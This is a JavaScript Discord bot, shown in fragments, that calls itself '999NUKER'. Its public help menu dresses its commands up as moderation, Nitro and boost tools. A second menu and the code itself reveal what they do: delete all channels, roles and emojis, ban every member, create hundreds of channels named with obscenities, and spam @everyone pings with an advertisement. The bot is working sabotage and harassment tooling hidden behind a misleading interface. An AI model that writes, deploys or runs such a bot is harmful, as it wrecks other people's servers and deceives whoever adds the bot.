...
client.on("ready", () => {
    console.log(green('           ═══════════════════════════════════'));
    console.log(blue(` ${client.user.username}#${client.user.discriminator}`));
    console.log(green('           ═══════════════════════════════════'));
    console.log("");
    client.user.setActivity({ type: "STREAMING", name: "By 999 | 999!help" }); // Delete this if you wish.
});
...
client.on("message", async message => {
    ...
    if (message.mentions.everyone === true) {
        ...
        const helpEmbed = new Discord.MessageEmbed()
            ...
            .setTitle('999NUKER')
            .setDescription(`*NUKE SOME BITCHES.*\n\n **Nuking:**\n
            ...
            **Server Annihilation:** \`${prefix}admin\` [text]
            `)
            .setThumbnail(``)
            .setFooter(`| Prefix: ${prefix} | Author: 999RAIDS |`)
            .setColor(0x36393E)
    ...
    if (disableEveryone === false) {
        ...
        if (message.content.startsWith(prefix + 'nuking')) {
            const helpEmbed = new Discord.MessageEmbed()
                .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
                .setTitle('999NUKER')
                .setDescription(`*HAVE FUN :smile:.*\n\n **Nuking:**\n
        **Mass Channel:** \`${prefix}fun\` [text]
        **Mass Channel & Ping:** \`${prefix}kick\` [text]
        **Mass Roles:** \`${prefix}mute\` [text]
        **Delete All Channels:** \`${prefix}ban\`
        **Delete All Roles:** \`${prefix}nitro\`
        **Delete All Emojis:** \`${prefix}boost\`
        **Ban All Members:** \`${prefix}warn\`
        **Destroys Server:** \`${prefix}admin\`
        **Change Name:** \`${prefix}text\` [text]
                `)
                .setFooter(`| Prefix: ${prefix} | Author: 999RAIDS |`)
                .setColor(0x00FF00)
            message.channel.send(helpEmbed);
        ...
        if (message.content.startsWith(prefix + 'help')) {
            const helpEmbed = new Discord.MessageEmbed()
                .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
                .setTitle('999 CUSOMIZABLE BOT')
                .setDescription(`*HAVE FUN :smile:.*\n\n **Admin:**\n
        **Fun Command:** \`${prefix}fun\` [text]
        **Kick User:** \`${prefix}kick\` [text]
        **Mute User:** \`${prefix}mute\` [text]
        **Ban User:** \`${prefix}ban\`
        **Starts Nitro Gen:** \`${prefix}nitro\`
        **Starts Boost Gen:** \`${prefix}boost\`
        **Warn Members:** \`${prefix}warn\`
        **Admin:** \`${prefix}admin\`
        **Text Command:** \`${prefix}text\` [text]
                `)
                .setFooter(`| Prefix: ${prefix} | Author: 999RAIDS |`)
                .setColor(0x00FF00)
            message.channel.send(helpEmbed);
        ...
        if (message.content.startsWith(prefix + 'kick')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                ...
                if (!argresult) {
                    for (var i = 0; i < 250; i++) {
                        message.guild.channels.create('FUCKED BY  ' + message.author.username)

                        for (var i = 0; i < 250; i++) {
                            let channels = message.guild.channels.create('FUCKED BY  ' + message.author.username)
        ...
        if (message.content.startsWith(prefix + 'text')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                ...
                message.guild.channels.cache.forEach(channel => channel.delete().then(
                    ...
                    // Channel Icon Change
                    message.guild.setIcon('https://discord.com/channels/805927980454510642/842342708239400970/852948771528114255') // changes server pfp
                ));
                ...
                if (!argresult) {
                    ...
                    for (var i = 0; i < 250; i++) {
                        ...
                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send(`@everyone ${argresult} **Bot Coded By 999RAIDS - https://youtube.com/channel/UCZLubapQSYe5RRnETTncppA`)
                                    console.log(blueBright(`CHANNEL PINGED!`));
                                    // other per-channnel logic
                                }
                            }
